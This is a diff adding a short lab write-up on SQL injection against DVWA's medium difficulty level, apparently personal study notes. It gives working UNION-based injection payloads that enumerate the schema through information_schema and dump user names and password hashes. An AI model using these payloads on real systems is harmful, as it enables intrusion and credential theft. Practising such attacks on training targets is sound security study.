@@ -1,0 +1,91 @@
+# April 12, 2022
+
+SQLinjection DVWA medium
+
+The level of difficulty has increased a minimum, we can't just input special characters to break the SQL statement anymore.
+
+User ID now is presetend as a dropdown menu with values of [1,2,3,4,5] and the query does not show in the URL
+
+That's not a problem if you're acquainted with burpsuite.
+
+Once we intercept the request we notice the POST request:
+
+```
+id=1&Submit=Submit
+```
+## Breaking the query
+
+The first attempt is to close the id=1 with a single quote (') and inject something after.
+
+```
+id=1'&Submit=Submit
+```
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'OR 1=1' at line 1.
+
+There seems to be a backslash character injected to escape the singlequote...
+
+```
+id=1+union+select+null,database()+--+&Submit=Submit
+```
+
+> admin
+> dvwa
+
+Now, we know the database name *dvwa*.
+
+```
+id=1+union+select+null,table_name+from+information_schema.tables+--+&Submit=Submit
+```
+
+The devs make it painful to insert special characters such as the equal sign (=) because they inject backslashes, so we'll have to sort out the output..
+
+> admin
+> guestbook
+> users
+
+Now we have tables name *guestbook* and *users*
+
+
+```
+id=1+union+select+null,column_name+from+information_schema.columns+--+&Submit=Submit
+```
+
+The output is polluted as we can't use the WHERE clause, but we still see interresting output
+
+> admin
+> comment_id
+> comment
+> name
+> user_id
+> first_name
+> last_name
+> user
+> password
+> avatar
+> ...
+
+## Exploiting to dump password hashes
+
+Now that we know the database name is dvwa, the users table contains columns such as *user* and *password* we can dump this info:
+
+```
+id=1+union+select+users.user,users.password+from+dvwa.users+--+&Submit=Submit
+```
+
+> First name: admin
+> Last name: admin
+> First name: admin
+> Last name: md5passwordhash
+> ...
+
+
+
+
+
+
+
+
+
+
+
